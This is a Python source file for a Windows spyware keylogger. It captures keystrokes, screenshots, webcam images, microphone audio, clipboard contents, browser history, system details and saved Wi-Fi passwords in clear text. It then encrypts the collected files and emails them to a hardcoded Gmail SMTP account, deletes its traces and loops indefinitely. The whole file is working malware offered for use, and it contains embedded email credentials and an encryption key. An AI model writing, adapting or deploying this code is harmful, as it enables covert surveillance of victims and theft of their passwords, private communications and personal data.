import subprocess                                   # Used to run new applications
import socket                                       # Used to write to Internet servers
import win32clipboard                               # System grabs the most recent clipboard data and saves it to a file
import os                                           # Provides functions for interacting with the operating system
import re                                           # Helps you match or find other strings or sets of strings
import smtplib                                      # Defines an SMTP client session object
import logging                                      # Allows writing status messages to a file or any other output streams
import pathlib                                      # Deals with path related tasks
import json                                         
import time                                         # Waiting during code execution & measuring the efficiency of your code.
import cv2                                          # Image processing, video capture
import sounddevice                                  # Play and record NumPy arrays containing audio signals
import shutil                                       # Automating process of copying and removal of files and directories
import requests                                     # Send HTTP/1.1 requests using Python
import browserhistory as bh                         # To get browser username, database paths, and history in JSON format
from multiprocessing import Process                 # supports spawning processes
from pynput.keyboard import Key, Listener           # Monitor input devices
from PIL import ImageGrab                           # Copy the contents of the screen or the clipboard to a PIL image memory
from scipy.io.wavfile import write as write_rec     # Write a NumPy array as a WAV file
from cryptography.fernet import Fernet              # Message encrypted using it cannot be manipulated or read without the key
from email.mime.multipart import MIMEMultipart      # Encodes ['From'], ['To'], and ['Subject']
from email.mime.text import MIMEText                # Sending text emails
from email.mime.base import MIMEBase                # Adds a Content-Type header
from email import encoders

################ Functions: Keystorke Capture, Screenshot Capture, Mic Recroding, Webcam Snapshot, Email Sending ################

# Keystroke Capture Funtion
def logg_keys(file_path):
    logging.basicConfig(filename = (file_path + 'key_logs.txt'), level=logging.DEBUG, format='%(asctime)s: %(message)s')
    on_press = lambda Key : logging.info(str(Key))  # Log the Pressed Keys
    with Listener(on_press=on_press) as listener:   # Collect events until released
        listener.join()

# Loop that records the microphone for 60 second intervals
def screenshot(file_path):
    pathlib.Path('C:/Users/Public/Logs/Screenshots').mkdir(parents=True, exist_ok=True)
    screen_path = file_path + 'Screenshots\\'

    for x in range(0,10):
        pic = ImageGrab.grab()
        pic.save(screen_path + 'screenshot{}.png'.format(x))
        time.sleep(5)                               # Gap between the each screenshot in sec

# Loop that save a picture every 5 seconds
def microphone(file_path):
    for x in range(0, 5):
        fs = 44100
        seconds = 10
        myrecording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
        sounddevice.wait()                          # To check if the recording is finished
        write_rec(file_path + '{}mic_recording.wav'.format(x), fs, myrecording)

# Webcam Snapshot Function #
def webcam(file_path):
    pathlib.Path('C:/Users/Public/Logs/WebcamPics').mkdir(parents=True, exist_ok=True)
    cam_path = file_path + 'WebcamPics\\'
    cam = cv2.VideoCapture(0)

    for x in range(0, 10):
        ret, img = cam.read()
        file = (cam_path  + '{}.jpg'.format(x))
        cv2.imwrite(file, img)
        time.sleep(5)

    cam.release                                     # Closes video file or capturing device
    cv2.destroyAllWindows

def email_base(name, email_address):
    name['From'] = email_address
    name['To'] =  email_address
    name['Subject'] = 'Success!!!'
    body = 'Mission is completed'
    name.attach(MIMEText(body, 'plain'))
    return name

def smtp_handler(email_address, password, name):
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(email_address, password)
    s.sendmail(email_address, email_address, name.as_string())
    s.quit()

def send_email(path):                               # Email sending function #
    regex = re.compile(r'.+\.xml$')
    regex2 = re.compile(r'.+\.txt$')
    regex3 = re.compile(r'.+\.png$')
    regex4 = re.compile(r'.+\.jpg$')
    regex5 = re.compile(r'.+\.wav$')

    email_address = 'QuiteHacker@instagram.com'         #<--- Enter your email address
    password = 'QuiteHacker@2021'                       #<--- Enter email password 
    
    msg = MIMEMultipart()
    email_base(msg, email_address)

    exclude = set(['Screenshots', 'WebcamPics'])
    for dirpath, dirnames, filenames in os.walk(path, topdown=True):
        dirnames[:] = [d for d in dirnames if d not in exclude]
        for file in filenames:
            # For each file in the filenames in the specified path, it will try to match the file extension to one of the regex variables.
            # If one of the first four regex variables match, then all of files of that data type will be attached to a single email message.
            if regex.match(file) or regex2.match(file) or regex3.match(file) or regex4.match(file):

                p = MIMEBase('application', "octet-stream")
                with open(path + '\\' + file, 'rb') as attachment:
                    p.set_payload(attachment.read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', 'attachment;' 'filename = {}'.format(file))
                msg.attach(p)

            # If regex5(WAV) variable matches, then that single match will be attached to its own individual email and sent.
            elif regex5.match(file):
                msg_alt = MIMEMultipart()
                email_base(msg_alt, email_address)
                p = MIMEBase('application', "octet-stream")
                with open(path + '\\' + file, 'rb') as attachment:
                    p.set_payload(attachment.read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', 'attachment;' 'filename = {}'.format(file))
                msg_alt.attach(p)

                smtp_handler(email_address, password, msg_alt)

            # If there are no matches then pass is called to keep the program moving.
            else:
                pass

    # To send any of the non WAV files
    smtp_handler(email_address, password, msg)


######################### Main Function: Network/Wifi Info, System Info, Clipbaord Data, Browser History #########################

# Once main is initiated the program begins by creating a directory to store the data it will gather.
def main():
    pathlib.Path('C:/Users/Public/Logs').mkdir(parents=True, exist_ok=True)
    file_path = 'C:\\Users\\Public\\Logs\\'

    # Retrieve Network/Wifi informaton for the network_wifi file
    with open(file_path + 'network_wifi.txt', 'a') as network_wifi:
        try:
            # Using the subprocess module a shell executes the specified commands with the standard output and error directed to the log file.
            commands = subprocess.Popen([ 'Netsh', 'WLAN', 'export', 'profile', 'folder=C:\\Users\\Public\\Logs\\', 'key=clear', 
                                        '&', 'ipconfig', '/all', '&', 'arp', '-a', '&', 'getmac', '-V', '&', 'route', 'print', '&',
                                        'netstat', '-a'], stdout=network_wifi, stderr=network_wifi, shell=True)
            # The communicate funtion is used to initiate a 60 second timeout for the shell.
            outs, errs = commands.communicate(timeout=60)   

        except subprocess.TimeoutExpired:
            commands.kill()
            out, errs = commands.communicate()

    # Retrieve system information for the system_info file
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)

    with open(file_path + 'system_info.txt', 'a') as system_info:
        try:
            public_ip = requests.get('https://api.ipify.org').text
        except requests.ConnectionError:
            public_ip = '* Ipify connection failed *'
            pass

        system_info.write('Public IP Address: ' + public_ip + '\n' + 'Private IP Address: ' + IPAddr + '\n')
        try:
            get_sysinfo = subprocess.Popen(['systeminfo', '&', 'tasklist', '&', 'sc', 'query'], 
                            stdout=system_info, stderr=system_info, shell=True)
            outs, errs = get_sysinfo.communicate(timeout=15)

        except subprocess.TimeoutExpired:
            get_sysinfo.kill()
            outs, errs = get_sysinfo.communicate()

    # Grabs the most recent clipboard data and saves it to a file
    win32clipboard.OpenClipboard()
    pasted_data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
    win32clipboard.CloseClipboard()
    with open(file_path + 'clipboard_info.txt', 'a') as clipboard_info:
        clipboard_info.write('Clipboard Data: \n' + pasted_data)

    # Get the browser username, database paths, and history in JSON format
    browser_history = []
    bh_user = bh.get_username()
    db_path = bh.get_database_paths()
    hist = bh.get_browserhistory()
    browser_history.extend((bh_user, db_path, hist))
    with open(file_path + 'browser.txt', 'a') as browser_txt:
        browser_txt.write(json.dumps(browser_history))


################################################### Using Multiprocess module ###################################################

    p1 = Process(target=logg_keys, args=(file_path,)) ; p1.start()  # Log Keys
    p2 = Process(target=screenshot, args=(file_path,)) ; p2.start() # Take Screenshots
    p3 = Process(target=microphone, args=(file_path,)) ; p3.start() # Record Microphone
    p4 = Process(target=webcam, args=(file_path,)) ; p4.start()     # Take Webcam Pictures

    # To stop execution of current program until a process is complete
    p1.join(timeout=300) ; p2.join(timeout=300) ; p3.join(timeout=300) ; p4.join(timeout=300)
    p1.terminate() ; p2.terminate() ; p3.terminate() ; p4.terminate()


######################################################## File Encryption ########################################################

    files = [ 'network_wifi.txt', 'system_info.txt', 'clipboard_info.txt', 'browser.txt', 'key_logs.txt' ]

    regex = re.compile(r'.+\.xml$')
    dir_path = 'C:\\Users\\Public\\Logs'

    for dirpath, dirnames, filenames in os.walk(dir_path):
        [ files.append(file) for file in filenames if regex.match(file) ]

    
    # To generate a key: Do the Following in the Python Console->
    # from cryptography.fernet import Fernet
    # Fernet.generate_key()
    
    key = b'MujBTqtZ4QCQW_fmlMHVWBmTVRW8IGZSuxFctu_D3d0='

    for file in files:
        with open(file_path + file, 'rb') as plain_text:            # Opens the file in binary format for reading
            data = plain_text.read()
        encrypted = Fernet(key).encrypt(data)
        with open(file_path + 'e_' + file, 'ab') as hidden_data:    # Appending to the end of the file if it exists
            hidden_data.write(encrypted)
        os.remove(file_path + file)

    # Send encrypted files to email account
    send_email('C:\\Users\\Public\\Logs')
    send_email('C:\\Users\\Public\\Logs\\Screenshots')
    send_email('C:\\Users\\Public\\Logs\\WebcamPics')

    shutil.rmtree('C:\\Users\\Public\\Logs')                        # Clean Up Files

    main()                                                          # Loop


# When an error occurs a detailed full stack trace can be logged to a file for an admin;
# while the user receives a much more vague message preventing information leakage.

if __name__ == '__main__':
    try:
        main()

    except KeyboardInterrupt:
        print('* Control-C entered...Program exiting *')

    except Exception as ex:
        logging.basicConfig(level=logging.DEBUG, filename='C:/Users/Public/Logs/error_log.txt')
        logging.exception('* Error Ocurred: {} *'.format(ex))
        pass
